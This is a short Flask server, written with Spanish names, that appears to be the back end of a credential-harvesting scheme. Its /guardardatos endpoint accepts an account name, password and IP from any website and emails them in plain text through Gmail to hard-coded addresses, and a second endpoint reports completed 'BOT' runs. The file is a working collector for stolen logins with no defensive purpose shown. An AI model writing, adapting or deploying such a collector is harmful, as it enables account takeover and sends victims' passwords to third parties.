import os
from flask import Flask
from flask import request
from flask import json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
from flask_cors import CORS, cross_origin


global mensajeConfirmacion
mensajeConfirmacion = {
    "detalle": "OK",
    "mensaje": "CORREO ENVIADO CORRECTAMENTE",
    "idMensaje": 0
}

correos = ['', '']
###########################################
#EMAIL


def enviarCorreo(encabezado, mensaje):
    print("Enviando correo")
    msg = MIMEMultipart()
    message = mensaje
    password = ""
    msg['From'] = ""
    msg['To'] = ", ".join(correos)
    msg['Subject'] = encabezado
    # add in the message body
    msg.attach(MIMEText(message, 'plain'))
    #create server
    server = smtplib.SMTP('smtp.gmail.com: 587')
    server.starttls()
    # Login Credentials for sending the mail
    server.login(msg['From'], password)
    # send the message via the server.
    server.sendmail(msg['From'], correos, msg.as_string())
    server.quit()



    

    
###########################################
#API

app = Flask(__name__)
cors = CORS(app)
app.config['CORS_HEADERS'] = 'Content-Type'
_port = os.environ.get('PORT', 5000)

@app.route("/", methods=['GET'])
@cross_origin()
def hello():
    return "", 200

@app.route('/guardardatos', methods=['POST'])
@cross_origin()
def guardarDatos():
    body = request.get_json()
    infoip=request.environ['REMOTE_ADDR']
    enviarCorreo("Información cuenta","Nombre: "+body["nombre_cuenta"]+ " "+ "Contraseña: "+body["contrasena"]+" "+ "IP: "+body["ip"])
    respuesta = app.response_class(
        response=json.dumps(mensajeConfirmacion),
        status=200,
        mimetype='application/json'
    )
    return respuesta

@app.route('/terminado', methods=['POST'])
@cross_origin()
def tareaCompleta():
    body = request.get_json()
    infoip=request.environ['REMOTE_ADDR']
    enviarCorreo("BOT +1", "DETALLE: "+body["detalle"]+
                 "\nHora de inicio del proceso: "+body["inicio"]+ "\nHora de finalización: "+body["fin"]+ "\nTiempo total transcurrido: "+body["transcurrido"]+"\nPróxima fecha de ejecución: "+body["proxfecha"] +"\nQue tenga buen día.")
    respuesta = app.response_class(
        response=json.dumps(mensajeConfirmacion),
        status=200,
        mimetype='application/json'
    )
    return respuesta


if __name__ == '__main__':
     app.run(host='0.0.0.0', port=_port)

